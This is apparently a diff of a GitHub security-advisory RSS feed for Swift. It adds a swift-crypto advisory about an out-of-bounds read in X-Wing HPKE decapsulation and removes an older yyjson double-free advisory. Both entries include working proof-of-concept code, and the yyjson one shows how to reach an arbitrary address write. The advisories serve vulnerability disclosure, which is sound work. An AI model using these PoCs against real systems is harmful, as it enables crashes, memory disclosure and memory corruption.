@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://azu.github.io/github-advisory-database-rss/swift.rss</id>
     <title>Security Advisory for Swift</title>
-    <updated>2026-04-03T02:58:55.831Z</updated>
+    <updated>2026-04-03T04:00:13.566Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Aswift"/>
     <subtitle>Security Advisory for Swift on GitHub</subtitle>
@@ -11,6 +11,139 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[swift-crypto] Swift Crypto: X-Wing HPKE Decapsulation Accepts Malformed Ciphertext Length]]></title>
+        <id>https://github.com/advisories/GHSA-9m44-rr2w-ppp7</id>
+        <link href="https://github.com/advisories/GHSA-9m44-rr2w-ppp7"/>
+        <updated>2026-04-03T03:39:42.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>The X-Wing decapsulation path accepts attacker-controlled encapsulated ciphertext bytes without enforcing the required fixed ciphertext length. The decapsulation call is forwarded into a C API, which expects a compile-time fixed-size ciphertext buffer of 1120 bytes. This creates an FFI memory-safety boundary issue when a shorter <code>Data</code> value is passed in, because the C code may read beyond the Swift buffer.</p>
+<p>The issue is reachable through initialization of an <code>HPKE.Recipient</code>, which decapsulates the provided <code>encapsulatedKey</code> during construction. A malformed <code>encapsulatedKey</code> can therefore trigger undefined behavior instead of a safe length-validation error.</p>
+<h3 id="details">Details</h3>
+<p>The <code>decapsulate</code> function of <code>OpenSSLXWingPrivateKeyImpl</code>  does not perform a length check before passing the <code>encapsulated</code> data to the C API.</p>
+<pre><code class="language-swift">func decapsulate(_ encapsulated: Data) throws -&gt; SymmetricKey {
+    try SymmetricKey(unsafeUninitializedCapacity: Int(XWING_SHARED_SECRET_BYTES)) { sharedSecretBytes, count in
+        try encapsulated.withUnsafeBytes { encapsulatedSecretBytes in
+            let rc = CCryptoBoringSSL_XWING_decap(
+                sharedSecretBytes.baseAddress,
+                encapsulatedSecretBytes.baseAddress,
+                &amp;self.privateKey
+            )
+            guard rc == 1 else {
+                throw CryptoKitError.internalBoringSSLError()
+            }
+            count = Int(XWING_SHARED_SECRET_BYTES)
+        }
+    }
+}
+</code></pre>
+<p>The C API does not have a runtime length parameter and instead expects a fixed-size buffer of 1120 bytes.</p>
+<pre><code class="language-c">#define XWING_CIPHERTEXT_BYTES 1120
+
+OPENSSL_EXPORT int XWING_decap(
+    uint8_t out_shared_secret[XWING_SHARED_SECRET_BYTES],
+    const uint8_t ciphertext[XWING_CIPHERTEXT_BYTES],
+    const struct XWING_private_key *private_key);
+</code></pre>
+<p>Since <code>decapsulate</code> accepts arguments of any length, an attacker controlled input can trigger an out-of-bounds read. The vulnerable code path can be reached through by initializing a <code>HPKE.Recipient</code>. This creates a new <code>HPKE.Context</code>, which decapsulates the attacker-controlled <code>enc</code> argument:</p>
+<pre><code class="language-swift">init&lt;PrivateKey: HPKEKEMPrivateKey&gt;(recipientRoleWithCiphersuite ciphersuite: Ciphersuite, mode: Mode, enc: Data, psk: SymmetricKey?, pskID: Data?, skR: PrivateKey, info: Data, pkS: PrivateKey.PublicKey?) throws {
+    let sharedSecret = try skR.decapsulate(enc)
+    self.encapsulated = enc
+    self.keySchedule = try KeySchedule(mode: mode, sharedSecret: sharedSecret, info: info, psk: psk, pskID: pskID, ciphersuite: ciphersuite)
+}
+</code></pre>
+<h3 id="poc">PoC</h3>
+<p>This PoC constructs an <code>HPKE.Recipient</code> using the X-Wing ciphersuite and deliberately passes a 1-byte <code>encapsulatedKey</code> instead of the required 1120 bytes. In a normal run, the malformed input is accepted and it reaches the vulnerable decapsulation path, i.e., no size rejection occurs. In an AddressSanitizer run, the same PoC produces a <code>dynamic-stack-buffer-overflow</code> read, confirming memory-unsafe behavior.</p>
+<pre><code class="language-swift">//===----------------------------------------------------------------------===//
+//
+// PoC for X-Wing malformed ciphertext-length decapsulation:
+// X-Wing decapsulation accepts malformed ciphertext length and forwards it to C.
+//
+// This test is intentionally unsafe and is expected to crash (or trip ASan)
+// on vulnerable builds when run.
+//
+//===----------------------------------------------------------------------===//
+
+#if canImport(FoundationEssentials)
+import FoundationEssentials
+#else
+import Foundation
+#endif
+import XCTest
+
+#if CRYPTO_IN_SWIFTPM &amp;&amp; !CRYPTO_IN_SWIFTPM_FORCE_BUILD_API
+// Skip tests that require @testable imports of CryptoKit.
+#else
+#if !CRYPTO_IN_SWIFTPM_FORCE_BUILD_API
+@testable import CryptoKit
+#else
+@testable import Crypto
+#endif
+
+final class XWingMalformedEncapsulationPoCTests: XCTestCase {
+    func testShortEncapsulatedKeyHPKERecipientInit() throws {
+        if #available(iOS 19.0, macOS 16.0, watchOS 12.0, tvOS 19.0, macCatalyst 19.0, *) {
+            let ciphersuite = HPKE.Ciphersuite.XWingMLKEM768X25519_SHA256_AES_GCM_256
+            let skR = try XWingMLKEM768X25519.PrivateKey.generate()
+            let malformedEncapsulatedKey = Data([0x00]) // should be 1120 bytes
+
+            // Vulnerable path: HPKE.Recipient -&gt; skR.decapsulate(enc) -&gt; XWING_decap(...)
+            _ = try HPKE.Recipient(
+                privateKey: skR,
+                ciphersuite: ciphersuite,
+                info: Data(),
+                encapsulatedKey: malformedEncapsulatedKey
+            )
+
+            XCTFail("Unexpectedly returned from malformed decapsulation path")
+        }
+    }
+}
+
+#endif // CRYPTO_IN_SWIFTPM
+</code></pre>
+<h4 id="steps">Steps</h4>
+<ol>
+<li>Add the PoC XCTest above to the test suite.</li>
+<li>Run the PoC normally to verify that malformed input is not rejected by length:<pre><code class="language-bash">swift test --filter XWingMalformedEncapsulationPoCTests/testShortEncapsulatedKeyHPKERecipientInit
+</code></pre>
+</li>
+<li>Run the same PoC with AddressSanitizer enabled to detect out-of-bounds memory access:<pre><code class="language-bash">swift test --sanitize=address --filter XWingMalformedEncapsulationPoCTests/testShortEncapsulatedKeyHPKERecipientInit
+</code></pre>
+</li>
+</ol>
+<h4 id="results">Results</h4>
+<h5 id="normal-run">Normal run</h5>
+<p>The PoC test reaches the <code>XCTFail</code> path. <code>HPKE.Recipient(...)</code> accepted a <code>1</code>-byte X-Wing encapsulated key instead of rejecting it for incorrect length.</p>
+<pre><code class="language-text">Test Case 'XWingMalformedEncapsulationPoCTests.testShortEncapsulatedKeyHPKERecipientInit' started
+... failed - Unexpectedly returned from malformed decapsulation path
+</code></pre>
+<h5 id="addresssanitizer-run">AddressSanitizer run</h5>
+<p>The sanitizer run aborts with a read overflow while executing the same PoC path. This confirms the memory-safety violation. The malformed ciphertext reaches memory-unsafe behavior in the decapsulation chain.</p>
+<pre><code class="language-text">ERROR: AddressSanitizer: dynamic-stack-buffer-overflow
+READ of size 1
+...
+SUMMARY: AddressSanitizer: dynamic-stack-buffer-overflow
+==...==ABORTING
+</code></pre>
+<h3 id="impact">Impact</h3>
+<p>A remote attacker can supply a short X-Wing HPKE encapsulated key and trigger an out-of-bounds read in the C decapsulation path, potentially causing a crash or memory disclosure depending on runtime protections.</p>
+<p>Reported by Cantina.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/apple/swift-crypto/security/advisories/GHSA-9m44-rr2w-ppp7">https://github.com/apple/swift-crypto/security/advisories/GHSA-9m44-rr2w-ppp7</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-28815">https://nvd.nist.gov/vuln/detail/CVE-2026-28815</a></li>
+<li><a href="https://github.com/advisories/GHSA-9m44-rr2w-ppp7">https://github.com/advisories/GHSA-9m44-rr2w-ppp7</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-9m44-rr2w-ppp7</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-04-03T03:39:38.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[github.com/beatt83/jose-swift] jose-swift has JWT Signature Verification Bypass via None Algorithm]]></title>
         <id>https://github.com/advisories/GHSA-88q6-jcjg-hvmw</id>
@@ -772,105 +905,5 @@ AWS SDK thanks Guy Arazi for bringing these customer security considerations to 
         </author>
         <category label="severity" term="MODERATE"/>
         <published>2024-11-09T00:30:42.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/ibireme/yyjson] yyjson has a Double Free vulnerability]]></title>
-        <id>https://github.com/advisories/GHSA-whx6-m9j4-w2m2</id>
-        <link href="https://github.com/advisories/GHSA-whx6-m9j4-w2m2"/>
-        <updated>2025-11-05T00:31:17.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>The pool series allocator (pool_malloc/pool_free/pool_realloc) by yysjon has a Double Free vulnerability, which may lead to arbitrary address writing and Denial of Service (DoS) attacks.
-Arbitrary address writing, combined with other legitimate or illegitimate operations of programs using this library, can lead to remote code execution.</p>
-<h3 id="details">Details</h3>
-<p>The core cause of this vulnerability lies in the pool_free function's lack of loop checks, while the direct cause stems from the pool_free function and similar free-series functions not performing pointer destruction, resulting in Use-After-Free (UAF) vulnerabilities.</p>
-<h3 id="poc">PoC</h3>
-<p>Below, a C language program using yyjson 0.8.0 is written to show how to exploit a Double Free vulnerability to cause chunk overlaps, which then allows the modification of a chunk's next pointer to point to an arbitrary address. If the targeted address is valid, modifications can be made. However, if the address is invalid, it could lead to the program crashing, which could be exploited for a Denial of Service (DoS) attack. Additionally, constructing a cyclic chain of chunks could force the service into an infinite loop, also exploitable for a DoS attack.</p>
-<pre><code>#include &lt;stdio.h&gt;
-#include "yyjson.h"
-
-char test[0x110];
-int64_t a=0xffffffff;
-int64_t b= (int64_t) test;
-
-int main() {
-
-    size_t max_json_size = 64 * 1024;
-
-    size_t buf_size = yyjson_read_max_memory_usage(max_json_size, 0);
-
-    void *buf = malloc(buf_size);
-
-    yyjson_alc alc;
-    yyjson_alc_pool_init(&amp;alc, buf, buf_size);
-
-    yyjson_mut_doc *p1 = yyjson_mut_doc_new(&amp;alc);
-    yyjson_mut_doc *p2 = yyjson_mut_doc_new(&amp;alc);
-    yyjson_mut_arr(p2);
-
-    yyjson_mut_doc *p3 = yyjson_mut_doc_new(&amp;alc);
-
-    yyjson_mut_doc_free(p2);
-    yyjson_mut_doc_free(p2); // double free
-    yyjson_mut_doc_free(p1);
-
-    yyjson_read_flag flg = YYJSON_READ_ALLOW_COMMENTS | YYJSON_READ_ALLOW_INF_AND_NAN;
-
-
-    for(int i=0;i&lt;0x100;i++)test[i]= 'a';
-    test[0x100]='\00';
-    char *payload_f = "[%lld,43981]";
-
-    char payload[100];
-    sprintf(payload,payload_f,&amp;a);
-    yyjson_mut_doc *p4 = yyjson_read_opts(payload,strlen(payload),flg,&amp;alc,NULL);
-
-    yyjson_mut_doc *p5 = yyjson_mut_doc_new(&amp;alc);
-    yyjson_mut_doc *p6 = yyjson_mut_doc_new(&amp;alc);
-    yyjson_mut_doc *p7 = yyjson_mut_doc_new(&amp;alc);
-    yyjson_mut_doc *p8 = yyjson_mut_doc_new(&amp;alc);
-    for(int z=1;z&lt;=100;z++)
-    yyjson_mut_int(p8,0x63636363);
-
-    printf("%s",test);
-    free(buf);
-    return 0;
-}
-</code></pre>
-<h3 id="impact">Impact</h3>
-<p><em>What kind of vulnerability is it? Who is impacted?</em></p>
-<h2 id="note-from-yyjson">Note from yyjson</h2>
-<p>yyjson_mut_doc_free() is well-documented:
-<a href="https://github.com/ibireme/yyjson/blob/0.8.0/src/yyjson.h#L2090-L2093">https://github.com/ibireme/yyjson/blob/0.8.0/src/yyjson.h#L2090-L2093</a></p>
-<pre><code>/** Release the JSON document and free the memory.
-    After calling this function, the `doc` and all values from the `doc` are no
-    longer available. This function will do nothing if the `doc` is NULL.  */
-void yyjson_mut_doc_free(yyjson_doc *doc);
-</code></pre>
-<p>If you have already called yyjson_mut_doc_free() on a doc, the doc and its internal values are invalid.
-Any further operation on the doc or its values is undefined behavior.</p>
-<p>While this is not a bug in yyjson itself, a defensive patch has been provided: <a href="https://github.com/ibireme/yyjson/commit/0eca326fe57aeeb866e6f04c9ef9ea9f8343157e">0eca326</a>
-If you mistakenly call yyjson_mut_doc_free() twice on the same doc against the documentation,
-this patch will cause your program to crash immediately, alerting you to the incorrect usage.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/ibireme/yyjson/security/advisories/GHSA-q4m7-9pcm-fpxh">https://github.com/ibireme/yyjson/security/advisories/GHSA-q4m7-9pcm-fpxh</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-25713">https://nvd.nist.gov/vuln/detail/CVE-2024-25713</a></li>
-<li><a href="https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/6KQ67T4R7QEWURW5NMCCVLTBASL4ECHE">https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/6KQ67T4R7QEWURW5NMCCVLTBASL4ECHE</a></li>
-<li><a href="https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/NNICQVIF7BRYFWYRL3HPVAJIPXN4OVTX">https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/NNICQVIF7BRYFWYRL3HPVAJIPXN4OVTX</a></li>
-<li><a href="https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/TKQPEREDUDKGYJMFNFDQVYCVLWDRO2Y2">https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/TKQPEREDUDKGYJMFNFDQVYCVLWDRO2Y2</a></li>
-<li><a href="https://github.com/ibireme/yyjson/commit/0eca326fe57aeeb866e6f04c9ef9ea9f8343157e">https://github.com/ibireme/yyjson/commit/0eca326fe57aeeb866e6f04c9ef9ea9f8343157e</a></li>
-<li><a href="https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/TKQPEREDUDKGYJMFNFDQVYCVLWDRO2Y2">https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/TKQPEREDUDKGYJMFNFDQVYCVLWDRO2Y2</a></li>
-<li><a href="https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/6KQ67T4R7QEWURW5NMCCVLTBASL4ECHE">https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/6KQ67T4R7QEWURW5NMCCVLTBASL4ECHE</a></li>
-<li><a href="https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/NNICQVIF7BRYFWYRL3HPVAJIPXN4OVTX">https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/NNICQVIF7BRYFWYRL3HPVAJIPXN4OVTX</a></li>
-<li><a href="https://github.com/advisories/GHSA-whx6-m9j4-w2m2">https://github.com/advisories/GHSA-whx6-m9j4-w2m2</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-whx6-m9j4-w2m2</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2024-02-29T03:33:18.000Z</published>
     </entry>
 </feed>
